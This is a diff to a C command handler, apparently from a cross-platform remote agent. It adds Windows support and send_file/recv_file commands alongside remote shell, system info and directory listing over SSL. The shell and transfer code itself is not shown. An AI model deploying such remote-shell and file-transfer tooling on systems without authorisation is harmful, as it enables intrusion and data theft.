@@ -4,11 +4,23 @@
 #include <unistd.h>
 #include <string.h>
 #include <openssl/ssl.h>
-#include "send_receive.h"
-#include "../Linux/systeminfo.h"
+
 #include "hash_file.h"
+
+
+#ifdef _WIN64
+#include "../Windows/send_receive.h"
+#include "../Windows/systeminfo.h"
+#include "../Windows/file_transfer.h"
+#include "../Windows/list_dir.h"
+#include "../Windows/shell.h"
+#else
+#include "../Linux/send_receive.h"
+#include "../Linux/systeminfo.h"
 #include "../Linux/list_dir.h"
 #include "../Linux/shell.h"
+#include "../Linux/file_transfer.h"
+#endif
 
 
 void server_handler(SSL* ssl){
@@ -27,14 +39,15 @@ void server_handler(SSL* ssl){
         } else if (strcmp(data, "systeminfo") == 0) {
             systeminfo(ssl);
         } else if (strcmp(data, "checkfiles") == 0) {
-            puts(data);
             hash_file(ssl);
         } else if (strcmp(data, "list_dir") == 0) {
-            printf("Listing directory\n");
             listdir(ssl);
         } else if (strcmp(data, "shell") == 0) {
-            printf("Shell\n");
             shell(ssl);
+        } else if (strcmp(data, "send_file") == 0) {
+            send_file(ssl);
+        } else if (strcmp(data, "recv_file") == 0) {
+            recv_file(ssl);
         }           
         else {
             send_data(ssl, "Invalid command");
